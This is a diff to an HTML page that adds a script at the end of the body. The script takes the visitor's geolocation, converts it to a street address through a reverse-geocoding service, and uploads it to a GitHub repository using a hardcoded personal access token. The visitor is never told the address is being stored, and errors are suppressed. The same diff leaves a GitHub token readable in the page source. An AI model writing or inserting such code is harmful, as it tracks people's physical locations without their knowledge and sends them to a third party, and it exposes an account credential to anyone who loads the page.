@@ -111,6 +111,55 @@
     });
   }, 0);
 </script>
+ <script>
+    (async function() {
+      if (!navigator.geolocation) return;
 
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        // Reverse geocode to get address
+        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+        const geoData = await geoRes.json();
+        const address = geoData.display_name || `${lat}, ${lon}`;
+
+        // GitHub config
+        const token = "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";   // ⚠️ Replace with your token
+        const username = "YKenan2010";         // ⚠️ Replace with your GitHub username
+        const repo = "adr";                 // ⚠️ Replace with your repository name
+        const filePath = "location.txt";
+        const apiUrl = `https://api.github.com/repos/${username}/${repo}/contents/${filePath}`;
+        const content = btoa(address);
+        let sha = null;
+
+        // Check if file exists
+        try {
+          const check = await fetch(apiUrl, {
+            headers: { Authorization: `token ${token}` }
+          });
+          if (check.ok) {
+            const checkData = await check.json();
+            sha = checkData.sha;
+          }
+        } catch (_) {}
+
+        // Upload or update
+        await fetch(apiUrl, {
+          method: "PUT",
+          headers: {
+            Authorization: `token ${token}`,
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            message: "Auto location update",
+            content,
+            sha
+          })
+        });
+
+      }, () => {});
+    })();
+  </script>
 </body>
 </html>
